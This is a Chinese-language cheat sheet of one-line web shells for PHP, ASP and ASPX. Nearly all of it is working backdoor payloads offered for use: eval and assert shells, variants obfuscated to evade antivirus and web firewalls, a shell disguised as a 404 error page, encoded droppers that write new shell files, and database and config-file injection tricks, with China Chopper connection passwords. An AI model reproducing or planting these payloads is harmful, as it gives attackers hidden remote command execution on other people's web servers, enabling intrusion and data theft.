PHP一句话：

	1、普通一句话

		<?php @eval($_POST['xlcst']);?>

	2、防爆破一句话

		<?php substr(md5($_REQUEST['x']),28)=='6862'&&eval($_REQUEST['xlcst']);?>    //菜刀地址http://192.168.64.137/x.php?x=myh0st  密码：xlcst

	3、过狗一句话
		<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['cmd']);?>
		<?php ($_=@$_GET[s]).@$_($_POST[xlcst])?>  //菜刀地址 http://localhost/1.php?s=assert

	<?php  $a = "a"."s"."s"."e"."r"."t";  $a($_POST[xlcst]);  ?>

	4、404隐藏一句话
	
		一句话代码如下：
			
		<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">  
		<html><head>  
		<title>404 Not Found</title>  
		</head><body>  
		<h1>Not Found</h1>  
		<p>The requested URL /error.php was not found on this server.</p>  
		</body></html>  
		<?php  
			@preg_replace("/[checksql]/e",$_POST['xlcst'],"saft");  
		?> 

		菜刀连接：
			
			在配置栏写上	<O>date=@eval($_POST[paxmac]);</O> 
		
	5、不用　?  号的一句话

		<script language="php">eval ($_POST[xlcst]);</script> 

	6、躲避检测
		
		<?php assert($_REQUEST["xlcst"]);?> 

	7、变形一句话后门

		<?php fputs (fopen(pack("H*","6c6f7374776f6c662e706870"),"w"),pack("H*","3c3f406576616c28245f504f53545b6c6f7374776f6c665d293f3e"))?>

		<?php @fputs(fopen(base64_decode('bXloMHN0LnBocA=='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydoaWhhY2snXSk7Pz4='));?>

		访问该网页，然后菜刀连接：/myh0st.php  密码：hihack

	8、
		<?
preg_replace("/\s*\[php\](.+?)\[\/php\]\s*/ies", "\\1", $_GET['h']);
?>

		*.php?h=[php]${${@eval($_POST[pass])}}[/php]
	9、<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("xlcst"))%>

ASP一句话：
	10、<?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["xlcst"]); ?>
	1、普通一句话：

		<%eval request("xlcst")%>		或 		<%execute(request("xlcst"))%> 

	2、unicode编码的access木马 

		向access数据库插入 ┼攠數畣整爠煥敵瑳∨≡┩>   编码前：<% execute request("a")%>

		然后备份出webshell，密码a

	3、配置文件插马（需要条件支持，插入的数据被写在了配置文件中）

		插入："%><% bbbb=request("aaaa")%><%eval(bbbb)%><%'		访问爆错，获取到配置文件的地址，然后连接，密码aaaa

	4、不用%的一句话
	
		<script language=VBScript runat=server>execute request("xlcst")</script>
	
	5、不用"的一句话：

		<%eval request(chr(35))%>		密码：#

	

ASPX一句话：

	1、普通一句话
		
		 <%@ Page Language="Jscript"%><%eval(Request.Item["xlcst"],"unsafe");%>

	2、免杀一句话
<%@PAGE LANGUAGE=JSCRIPT%><%var PAY:String=Request["\x61\x62\x63\x64"];eval(PAY,"\x75\x6E\x73\x61"+"\x66\x65");%> 


JSP一句话：（貌似没有用菜刀连的一句话！）
	
	这个没怎么用过的，还请大牛补充！
		
	
